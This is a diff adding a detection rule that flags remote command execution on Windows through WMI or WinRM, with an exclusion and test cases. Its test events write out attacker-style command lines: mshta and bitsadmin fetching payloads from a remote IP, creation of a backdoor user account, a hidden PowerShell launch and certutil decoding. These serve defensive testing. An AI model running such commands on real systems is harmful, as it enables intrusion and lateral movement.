@@ -1,0 +1,97 @@
+id: DET-020
+title: Remote command run through WMI or WinRM
+status: experimental
+severity: high
+attack:
+  tactic: Lateral Movement
+  technique: T1047
+  technique_name: Windows Management Instrumentation
+  also: [T1021.006]
+description: >
+  A shell, script host, or signed Windows helper program was started by the WMI provider host (wmiprvse.exe)
+  or by the WinRM host (wsmprovhost.exe), or "wmic /node: ... process call create" was used. That is how a
+  command arrives when someone runs it on this computer from another one through WMI or PowerShell Remoting.
+  Attackers use both to move between hosts with only built-in tools.
+type: match
+filter:
+  - action: process_create
+    parent_process|in: [wmiprvse.exe, wsmprovhost.exe]
+    process_name,original_name|in: [cmd.exe, powershell.exe, pwsh.exe, wscript.exe, cscript.exe, mshta.exe, rundll32.exe, regsvr32.exe, certutil.exe, bitsadmin.exe]
+  - action: process_create
+    process_name,original_name: wmic.exe
+    command_line|regex: '(?i)/node:.*\bprocess\s+call\s+create\b'
+entity_fields: [user, host, parent_process, process_name]
+suppress_seconds: 120
+exclusions:
+  - match:
+      user: svc_monitor
+      host: SRV-FILE-01
+      parent_process: wmiprvse.exe
+      process_name: cmd.exe
+      command_line|regex: '(?i)^cmd\.exe /c (hostname|ipconfig|ping -n 1 \S+)$'
+    reason: The monitoring server runs three fixed health-check commands on the file server through WMI every Monday (ticket IT-2315). Pinned to the account, the host AND the exact commands, so any other command through WMI still alerts.
+false_positives: >
+  Management tools (monitoring, inventory, software deployment) and administrators using Invoke-Command.
+triage:
+  - Which account authenticated, and from which computer? (Check the logon events just before.)
+  - What did the command do, and what did it start next?
+  - Is the source computer one that normally manages this one?
+response:
+  - Isolate the source computer if it is not a management host.
+  - Reset the account used and look at where else it signed in.
+tests:
+  - name: wmiprvse starting cmd.exe fires
+    expect: fire
+    events:
+      - {action: process_create, user: wardog, host: WS-007, process_name: cmd.exe, parent_process: wmiprvse.exe, command_line: 'cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1.out 2>&1'}
+  - name: wsmprovhost starting a script host fires
+    expect: fire
+    events:
+      - {action: process_create, user: wardog, host: WS-007, process_name: cscript.exe, parent_process: wsmprovhost.exe, command_line: 'cscript.exe C:\Users\Public\x.vbs'}
+  - name: wmic running a process on another node fires
+    expect: fire
+    events:
+      - {action: process_create, user: wardog, host: WS-005, process_name: wmic.exe, parent_process: cmd.exe, command_line: 'wmic /node:WS-007 process call create "cmd.exe /c calc.exe"'}
+  - name: wmic only reading information stays quiet
+    expect: no_fire
+    events:
+      - {action: process_create, user: it.admin, host: WS-001, process_name: wmic.exe, parent_process: cmd.exe, command_line: 'wmic /node:WS-007 os get caption'}
+  - name: wmiprvse starting an ordinary program stays quiet
+    expect: no_fire
+    events:
+      - {action: process_create, user: SYSTEM, host: WS-007, process_name: werfault.exe, parent_process: wmiprvse.exe, command_line: 'werfault.exe -u -p 4120'}
+  - name: the monitoring health check on the file server is excluded
+    expect: no_fire
+    events:
+      - {action: process_create, user: svc_monitor, host: SRV-FILE-01, process_name: cmd.exe, parent_process: wmiprvse.exe, command_line: 'cmd.exe /c hostname'}
+  - name: the monitoring account running another command still fires
+    expect: fire
+    events:
+      - {action: process_create, user: svc_monitor, host: SRV-FILE-01, process_name: cmd.exe, parent_process: wmiprvse.exe, command_line: 'cmd.exe /c net user backdoor P@ss1 /add'}
+  - name: every listed program is caught when WMI starts it
+    expect: fire
+    alerts: 10
+    events:
+      - {action: process_create, user: wardog, host: WS-201, process_name: cmd.exe, parent_process: wmiprvse.exe, command_line: 'cmd.exe /c whoami'}
+      - {action: process_create, user: wardog, host: WS-201, process_name: powershell.exe, parent_process: wmiprvse.exe, command_line: 'powershell.exe -nop -w hidden'}
+      - {action: process_create, user: wardog, host: WS-201, process_name: pwsh.exe, parent_process: wmiprvse.exe, command_line: 'pwsh.exe -nop'}
+      - {action: process_create, user: wardog, host: WS-201, process_name: wscript.exe, parent_process: wmiprvse.exe, command_line: 'wscript.exe C:\Users\Public\x.vbs'}
+      - {action: process_create, user: wardog, host: WS-201, process_name: cscript.exe, parent_process: wmiprvse.exe, command_line: 'cscript.exe C:\Users\Public\x.vbs'}
+      - {action: process_create, user: wardog, host: WS-201, process_name: mshta.exe, parent_process: wmiprvse.exe, command_line: 'mshta.exe http://203.0.113.9/a.hta'}
+      - {action: process_create, user: wardog, host: WS-201, process_name: rundll32.exe, parent_process: wmiprvse.exe, command_line: 'rundll32.exe C:\Users\Public\x.dll,Run'}
+      - {action: process_create, user: wardog, host: WS-201, process_name: regsvr32.exe, parent_process: wmiprvse.exe, command_line: 'regsvr32.exe /s C:\Users\Public\x.dll'}
+      - {action: process_create, user: wardog, host: WS-201, process_name: certutil.exe, parent_process: wmiprvse.exe, command_line: 'certutil.exe -decode a.b64 a.exe'}
+      - {action: process_create, user: wardog, host: WS-201, process_name: bitsadmin.exe, parent_process: wmiprvse.exe, command_line: 'bitsadmin.exe /transfer j http://203.0.113.9/a.exe C:\Users\Public\a.exe'}
+  - name: cmd.exe started by the desktop shell stays quiet
+    expect: no_fire
+    events:
+      - {action: process_create, user: k.lee, host: WS-004, process_name: cmd.exe, parent_process: explorer.exe, command_line: cmd.exe}
+  - name: the same words typed into another program do not count
+    expect: no_fire
+    events:
+      - {action: process_create, user: k.lee, host: WS-004, process_name: notepad.exe, parent_process: explorer.exe, command_line: 'notepad.exe notes about wmic /node:srv01 process call create calc.exe'}
+  - name: the same event three times in a row is folded into one alert (repeats are throttled, not paged again)
+    expect: fire
+    alerts: 1
+    events:
+      - {action: process_create, user: wardog, host: WS-007, process_name: cmd.exe, parent_process: wmiprvse.exe, command_line: 'cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1.out 2>&1', repeat: 3, every: 10s}
